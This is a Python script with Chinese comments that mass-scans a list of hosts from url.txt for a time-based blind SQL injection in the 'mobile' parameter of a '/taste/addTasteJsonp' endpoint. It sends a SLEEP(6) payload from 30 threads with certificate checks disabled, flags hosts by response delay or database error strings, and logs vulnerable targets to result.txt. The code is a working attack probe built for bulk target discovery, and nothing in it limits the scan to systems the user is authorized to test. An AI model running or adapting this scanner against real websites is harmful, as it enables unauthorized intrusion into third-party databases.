import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from urllib.parse import urljoin, urlparse
import re

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置参数
MAX_THREADS = 30
TIMEOUT = 10  # 请求超时时间
SLEEP_TIME = 6  # 注入语句中的睡眠时间
THRESHOLD = 5.5  # 时间阈值（考虑到网络延迟，略小于SLEEP_TIME）

# SQL错误关键词列表（更具体的数据库错误特征）
SQL_ERROR_KEYWORDS = [
    # MySQL 错误
    'mysql_fetch', 'mysql_num_rows', 'mysql_', 'you have an error in your sql syntax',
    'warning: mysql', 'supplied argument is not a valid mysql result',
    'unclosed quotation mark', 'quoted string not properly terminated',
    
    # Oracle 错误
    'ora-', 'oracle error', 'pl/sql', 'oci', 'tns:',
    
    # SQL Server 错误
    'microsoft odbc', 'sql server', 'odbc driver', 'odbc error',
    'sqlcmd', 'unclosed quotation mark after the character string',
    
    # PostgreSQL 错误
    'postgresql', 'pg_', 'psql:', 'org.postgresql.util.psqlexception',
    
    # 通用错误模式
    'sql syntax', 'syntax error', 'sql query', 'database error',
    'query failed', 'invalid query', 'division by zero',
    'type mismatch', 'conversion failed', 'string or binary data would be truncated',
    'violation of', 'cannot insert', 'cannot update', 'cannot delete',
    'column.*does not exist', 'table.*does not exist', 'unknown column',
    'unknown table', 'unknown database', 'access denied for user',
    'login failed', 'incorrect syntax'
]

def format_url(url):
    """
    格式化URL：添加协议头，移除末尾斜杠
    """
    url = url.strip()
    
    # 如果没有协议头，添加http://
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
        print(f"🔧 自动添加协议头: {url}")
    
    # 移除末尾斜杠
    if url.endswith('/'):
        url = url[:-1]
        print(f"🔧 移除末尾斜杠: {url}")
    
    return url

def check_sql_errors(response_text, baseline_text=None):
    """
    检查响应中是否包含SQL错误特征，并与基准响应对比
    """
    content_lower = response_text.lower()
    sql_errors_found = []
    
    # 检查SQL错误关键词
    for keyword in SQL_ERROR_KEYWORDS:
        pattern = r'\b' + re.escape(keyword.lower()) + r'\b'
        if re.search(pattern, content_lower):
            sql_errors_found.append(keyword)
    
    # 检查常见的错误模式
    error_patterns = [
        r'error\s+\d+',  # 错误代码
        r'exception:\s*\w+',  # 异常信息
        r'at\s+[\w\.]+\.\w+',  # 堆栈跟踪
        r'line\s+\d+',  # 行号
        r'column\s+\d+',  # 列号
    ]
    
    for pattern in error_patterns:
        matches = re.findall(pattern, content_lower, re.IGNORECASE)
        if matches:
            sql_errors_found.extend(matches)
    
    # 与基准响应对比（如果有的话）
    if baseline_text:
        baseline_lower = baseline_text.lower()
        # 检查响应中是否出现了基准响应中没有的新错误信息
        new_errors = []
        for error in sql_errors_found:
            if error.lower() not in baseline_lower:
                new_errors.append(error)
        return new_errors
    
    return sql_errors_found

def get_baseline_response(url):
    """
    获取基准响应（正常请求的响应）
    """
    try:
        baseline_path = "/taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1"
        baseline_url = urljoin(url, baseline_path.lstrip('/'))
        
        response = requests.get(
            baseline_url,
            timeout=TIMEOUT,
            verify=False,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        return response.text
    except:
        return None

def check_sql_injection(url):
    """
    检测指定URL是否存在SQL注入漏洞
    """
    # 格式化URL
    formatted_url = format_url(url)
    
    # 获取基准响应（正常请求）
    baseline_text = get_baseline_response(formatted_url)
    
    # 拼接测试路径（注入路径）
    test_path = "/taste/addTasteJsonp?company=1&userName=1&jsonpcallback=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(6)))mKjk)%20OR%20%27KQZm%27=%27REcX"
    target_url = urljoin(formatted_url + '/', test_path.lstrip('/'))
    
    try:
        # 记录开始时间
        start_time = time.time()
        
        # 发送请求
        response = requests.get(
            target_url,
            timeout=TIMEOUT,
            verify=False,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        )
        
        # 计算响应时间
        response_time = time.time() - start_time
        
        # 检查状态码和响应时间
        if response.status_code == 200:
            # 检查响应时间是否符合注入特征
            time_based_vulnerable = response_time >= THRESHOLD
            
            # 检查SQL错误特征（与基准响应对比）
            sql_errors_found = check_sql_errors(response.text, baseline_text)
            error_based_vulnerable = len(sql_errors_found) > 0
            
            # 判断是否存在漏洞
            if time_based_vulnerable or error_based_vulnerable:
                result = f"漏洞发现 - URL: {target_url}, 状态码: {response.status_code}"
                
                if time_based_vulnerable:
                    result += f", 响应时间: {response_time:.2f}s (符合时间注入)"
                
                if error_based_vulnerable:
                    result += f", SQL错误特征: {', '.join(sql_errors_found[:5])}"  # 只显示前5个错误特征
                    
                    # 记录详细的错误信息
                    error_details = "\n错误详情:\n"
                    for error in sql_errors_found:
                        # 在响应文本中找到错误出现的位置
                        error_lines = []
                        lines = response.text.split('\n')
                        for i, line in enumerate(lines):
                            if error.lower() in line.lower():
                                # 截取错误上下文
                                context = line.strip()[:100]  # 只取前100个字符
                                error_lines.append(f"  第{i+1}行: {context}")
                                if len(error_lines) >= 3:  # 最多显示3处
                                    break
                        
                        error_details += f"特征 '{error}' 出现位置:\n"
                        error_details += '\n'.join(error_lines) + "\n"
                    
                    result += error_details
                
                # 写入结果文件
                with file_lock:
                    with open('result.txt', 'a', encoding='utf-8') as f:
                        f.write(result + '\n' + '='*80 + '\n')
                
                print(f"✅ {result.split('错误详情:')[0]}")  # 控制台只显示摘要
                return True, target_url, response.status_code, response_time, sql_errors_found
            else:
                print(f"❌ 无漏洞 - URL: {target_url}, 状态码: {response.status_code}, 响应时间: {response_time:.2f}s")
                return False, target_url, response.status_code, response_time, []
        else:
            print(f"⚠️  状态码异常 - URL: {target_url}, 状态码: {response.status_code}, 响应时间: {response_time:.2f}s")
            return False, target_url, response.status_code, response_time, []
            
    except requests.exceptions.Timeout:
        print(f"⏰ 请求超时 - URL: {target_url}")
        return False, target_url, 0, 0, []
        
    except requests.exceptions.ConnectionError:
        print(f"🔌 连接错误 - URL: {target_url}")
        return False, target_url, 0, 0, []
        
    except requests.exceptions.RequestException as e:
        print(f"❓ 请求异常 - URL: {target_url}, 错误: {str(e)}")
        return False, target_url, 0, 0, []
        
    except Exception as e:
        print(f"💥 未知错误 - URL: {target_url}, 错误: {str(e)}")
        return False, target_url, 0, 0, []

# 线程锁用于文件写入
file_lock = threading.Lock()

def load_urls_from_file(filename):
    """
    从文件加载URL列表并进行格式化
    """
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            urls = [format_url(line.strip()) for line in f if line.strip()]
        return list(set(urls))  # 去重
    except FileNotFoundError:
        print(f"错误: 文件 {filename} 不存在")
        return []
    except Exception as e:
        print(f"读取文件时出错: {str(e)}")
        return []

def generate_report(vulnerable_results):
    """
    生成详细的检测报告
    """
    report = f"\n{'='*80}\n"
    report += "SQL注入漏洞检测详细报告\n"
    report += f"{'='*80}\n\n"
    
    time_based_count = 0
    error_based_count = 0
    both_count = 0
    
    for result in vulnerable_results:
        url, status, response_time, errors, is_time_based, is_error_based = result
        
        report += f"目标URL: {url}\n"
        report += f"状态码: {status}\n"
        report += f"响应时间: {response_time:.2f}s\n"
        
        if is_time_based:
            time_based_count += 1
            report += "🔍 时间盲注: 存在\n"
        
        if is_error_based:
            error_based_count += 1
            report += f"🔍 错误回显: 存在 ({len(errors)}个错误特征)\n"
            report += "检测到的错误特征:\n"
            for error in errors:
                report += f"  - {error}\n"
        
        if is_time_based and is_error_based:
            both_count += 1
            
        report += "-" * 50 + "\n"
    
    report += f"\n统计信息:\n"
    report += f"时间盲注漏洞: {time_based_count}个\n"
    report += f"错误回显漏洞: {error_based_count}个\n"
    report += f"同时存在两种漏洞: {both_count}个\n"
    
    return report

def main():
    """
    主函数
    """
    print("=" * 80)
    print("SQL注入漏洞检测脚本（增强版）")
    print(f"线程数: {MAX_THREADS}, 超时: {TIMEOUT}s, 时间阈值: {THRESHOLD}s")
    print("=" * 80)
    
    # 加载URL列表
    urls = load_urls_from_file('url.txt')
    
    if not urls:
        print("未找到有效的URL，请检查url.txt文件")
        return
    
    print(f"成功加载 {len(urls)} 个URL")
    print("开始检测...\n")
    
    # 清空结果文件
    with open('result.txt', 'w', encoding='utf-8') as f:
        f.write(f"SQL注入漏洞检测结果 - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 80 + "\n\n")
    
    # 使用线程池进行并发检测
    vulnerable_results = []
    vulnerable_count = 0
    total_count = len(urls)
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(check_sql_injection, url): url for url in urls}
        
        # 处理完成的任务
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                is_vulnerable, target_url, status, response_time, errors = result
                
                if is_vulnerable:
                    vulnerable_count += 1
                    # 判断漏洞类型
                    is_time_based = response_time >= THRESHOLD
                    is_error_based = len(errors) > 0
                    vulnerable_results.append((target_url, status, response_time, errors, is_time_based, is_error_based))
                    
            except Exception as e:
                print(f"任务执行出错 - URL: {url}, 错误: {str(e)}")
    
    # 生成详细报告并写入文件
    if vulnerable_results:
        report = generate_report(vulnerable_results)
        with open('result.txt', 'a', encoding='utf-8') as f:
            f.write(report)
    
    # 输出统计结果
    print("\n" + "=" * 80)
    print("检测完成！")
    print(f"总计检测: {total_count} 个URL")
    print(f"发现漏洞: {vulnerable_count} 个")
    print(f"漏洞详情已保存至: result.txt")
    print("=" * 80)

if __name__ == "__main__":
    main()